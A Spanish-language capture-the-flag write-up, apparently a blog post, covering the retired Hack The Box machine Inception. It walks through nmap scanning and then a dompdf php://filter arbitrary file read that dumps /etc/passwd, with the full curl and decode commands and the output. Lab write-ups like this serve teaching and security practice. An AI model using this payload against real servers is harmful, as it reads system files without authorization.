---
layout: post
title:  "Maquina Retirada Inception de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada INCEPTION
tags: HTB, dompdf, Remote File Read, squidproxy, webdav, CronTabs, Web Hacking, Maquinas Retiradas, Writeup
---

# Inception ~ Hack The Box

Realizamos el Primer escaneo con Nmap
```bash
# nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.10.10.67
```
Realizamos el segundo escaneo para averiguar la version y servicios en los puerto abiertos
```bash
# nmap -sC -sV -p80,3128 -Pn -n -v 10.10.10.67

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Inception
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
```

Procedemos a enumerar el servicio `http` con la herramienta `whatweb`
```bash
# whatweb http://10.10.10.67                                                                                                                                                     
http://10.10.10.67 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.67], Script, Title[Inception]
```
Procedemos a hechar un ojo a la pagina web y al codigo fuente de la misma.
```bash
curl -s -X GET "http://10.10.10.67/"
<!-- Todo: test dompdf on php 7.x -->
```
Encontramos al final de codigo fuente algo sobre `DOMPDF`
Investigamos a nivel google que es DOMPDF:   `DOMPDF es un conversor de HTML a PDF escrito en PHP`
Buscamos Exploits Github para DOMPDF:   Encontramos este exploit de Arbitrary File Read en github-- `https://github.com/defarbs/dompdf-exploit`
```bash
curl -s -X GET "10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd"
```

Tratamos el `Output del comando anterior para verlo todo guay y decodificarlo`
```bash
# curl -s -X GET "10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd" | grep -E '[.*?]' | grep -v  '%' | grep -v '/MediaBox' | grep -v '0.000' | awk '{print $8}' | tr -d '[()]' | base64 -d

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
cobb:x:1000:1000::/home/cobb:/bin/bash
```
Identificamos un usuario llamado `cobb` 
Ahora que tenemos la vulnerabilidad de leer archivos de la maquina victima vamos a buscar por recursos interesantes en el sistema.
